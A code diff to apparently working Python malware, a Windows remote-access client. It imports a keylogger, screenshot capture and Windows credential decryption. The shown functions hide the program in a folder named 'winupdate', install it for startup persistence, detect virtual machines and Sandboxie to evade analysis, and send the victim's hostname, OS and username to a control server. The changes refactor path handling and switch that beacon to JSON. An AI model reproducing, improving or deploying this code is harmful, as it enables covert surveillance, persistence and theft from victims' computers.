@@ -1,4 +1,4 @@
-import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
+import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, threading, pynput.keyboard, wmi, json
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
@@ -25,7 +25,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 
 # function to move file to tmp dir and relaunch
 def meltFile():
-    winupdate = TMP + "\\winupdate"
+    winupdate = os.path.join(TMP, "winupdate")
     # ignore if the path is in appdata as well
     if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
         # if folder already exists
@@ -58,7 +58,7 @@ def detectVM():
 
 def startup(onstartup):
     try:
-        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
+        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
         if not os.getcwd() == APPDATA:
             copyfile(strPath, strAppPath)
 
@@ -96,14 +96,15 @@ def server_connect():
             time.sleep(5)  # wait 5 seconds to try again
         else: break
 
-    strUserInfo = f"{socket.gethostname()}`,{platform.system()} {platform.release()}"
+    arrUserInfo = [socket.gethostname()]
+    strPlatform = f"{platform.system()} {platform.release()}"
     if detectSandboxie():
-        strUserInfo += " (Sandboxie) "
+        strPlatform += " (Sandboxie) "
     if detectVM():
-        strUserInfo += " (Virtual Machine) "
-    strUserInfo += f"`,{os.environ['USERNAME']}"
+        strPlatform += " (Virtual Machine) "
+    arrUserInfo.extend([strPlatform, os.environ['USERNAME']])
 
-    send(str.encode(strUserInfo))
+    send(str.encode(json.dumps(arrUserInfo)))
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
